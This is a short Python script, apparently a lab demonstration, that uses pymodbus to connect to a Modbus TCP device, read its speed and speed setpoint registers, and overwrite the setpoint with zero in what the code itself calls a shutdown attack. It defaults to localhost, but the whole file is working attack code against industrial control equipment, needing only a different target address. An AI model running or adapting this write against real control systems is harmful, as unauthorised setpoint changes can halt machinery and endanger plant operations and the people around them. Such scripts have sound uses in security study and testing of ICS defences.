#!/usr/bin/env python3

import time

from pymodbus.client import ModbusTcpClient


def demonstrate_shutdown_attack(target_ip: str) -> None:
    client = ModbusTcpClient(host=target_ip, port=502)

    if not client.connect():
        raise RuntimeError("Cannot connect to target")

    print("[*] Connected to target")

    # Read current speed
    speed = client.read_input_registers(address=2000, count=1)
    if not speed.isError():
        print(f"Current speed: {speed.registers[0]} RPM")
    else:
        print("[!] Failed to read speed")

    # Read current setpoint
    setpoint = client.read_holding_registers(address=1000, count=1)
    if not setpoint.isError():
        print(f"Current setpoint: {setpoint.registers[0]} RPM")
    else:
        print("[!] Failed to read setpoint")

    # Attack: write zero to speed setpoint
    print("[*] Writing zero to speed setpoint (attack)")
    result = client.write_register(address=1000, value=0)

    if result.isError():
        print("[!] Write failed")
    else:
        print("[âœ“] Write succeeded")

    time.sleep(1)

    # Verify the write
    verify = client.read_holding_registers(address=1000, count=1)
    if not verify.isError():
        print(f"New setpoint: {verify.registers[0]} RPM")
    else:
        print("[!] Failed to verify")

    client.close()


if __name__ == "__main__":
    demonstrate_shutdown_attack("127.0.0.1")
